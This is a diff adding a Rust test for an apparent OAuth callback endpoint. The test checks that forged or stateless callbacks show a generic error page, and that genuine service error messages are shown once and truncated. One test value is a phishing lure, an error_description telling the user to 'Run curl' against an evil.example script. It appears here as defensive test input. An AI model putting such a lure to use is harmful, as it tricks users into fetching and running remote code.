@@ -448,6 +448,37 @@ async fn a_remote_server_signs_in_once_in_pdt_and_every_session_gets_a_fresh_bea
 }
 
 #[tokio::test]
+async fn the_callback_shows_a_services_reason_only_for_a_sign_in_under_way() {
+    let env = setup().await;
+    // Any link's text, without a state PDT issued: a generic page, not the link's words on PDT's address.
+    let lure = "/api/mcp-oauth/callback?error=x&error_description=Run%20curl%20https://evil.example/fix.sh";
+    for path in [lure.to_string(), format!("{lure}&state=forged")] {
+        let (s, _, page) = common::call_raw(&env.app, "GET", &path, vec![]).await;
+        let page = String::from_utf8(page).unwrap();
+        assert_eq!(s, StatusCode::BAD_REQUEST);
+        assert!(!page.contains("evil.example") && page.contains("unknown or too old"), "{page}");
+    }
+
+    // The service PDT sent the browser to, for this sign-in: its reason is shown, once, at most a line long.
+    let f = fake_service().await;
+    let base = f.lock().unwrap().base.clone();
+    let id = server(&env, "Slack", &format!("{base}/mcp"), json!({"transport": "http", "oauth": {}})).await;
+    let (s, start) = call(&env.app, "POST", &format!("/api/mcp-servers/{id}/sign-in"), None).await;
+    assert_eq!(s, StatusCode::OK, "{start}");
+    let url = start["url"].as_str().unwrap();
+    let state = url.split("state=").nth(1).unwrap().split('&').next().unwrap();
+    let long = "a".repeat(500);
+    let path =
+        format!("/api/mcp-oauth/callback?error=access_denied&error_description=You%20said%20no{long}&state={state}");
+    let (s, _, page) = common::call_raw(&env.app, "GET", &path, vec![]).await;
+    let page = String::from_utf8(page).unwrap();
+    assert_eq!(s, StatusCode::BAD_REQUEST);
+    assert!(page.contains("didn't sign PDT in: You said no") && !page.contains(&long), "{page}");
+    let (_, _, page) = common::call_raw(&env.app, "GET", &path, vec![]).await;
+    assert!(String::from_utf8(page).unwrap().contains("unknown or too old"));
+}
+
+#[tokio::test]
 async fn a_sign_in_address_that_isnt_https_is_refused_before_the_browser_goes_there() {
     let env = setup().await;
     let f = fake_service().await;
